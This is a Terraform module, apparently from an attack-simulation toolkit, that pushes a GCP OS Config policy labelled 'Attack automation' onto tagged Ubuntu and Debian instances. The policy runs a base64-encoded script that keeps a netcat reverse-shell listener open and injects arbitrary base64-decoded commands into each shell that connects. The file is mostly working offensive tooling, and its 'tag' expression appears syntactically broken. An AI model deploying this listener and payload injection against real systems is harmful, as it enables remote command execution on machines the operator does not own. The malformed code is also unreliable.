locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOGFILE=/tmp/osconfig_attacker_exec_reverseshell_listener.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "listener: ${local.listen_ip}:${local.listen_port}"
    while true; do
        screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
        truncate -s 0 /tmp/netcat.log
        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
        screen -S netcat -X colon "logfile flush 0^M"
        log "listener started.."
        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
            log "waiting for connection...";
            sleep 10;
        done
        sleep 30
        log 'sending screen command: ${var.payload}';
        screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
        sleep 300
        log "restarting attacker session..."
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

locals {
  tag = [for k,v in var.label: replace(replace(k, "_", "-"),"osconfig_","")[0]
}

resource "random_id" "this" {
    byte_length = 1
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "this" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "${local.tag}-${var.environment}-${var.deployment}-${random_id.this.id}"
  description = "Attack automation"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = var.label
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id   = "${local.tag}-${var.environment}-${var.deployment}-${random_id.this.id}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 100
    }
    min_wait_duration = var.timeout
  }
}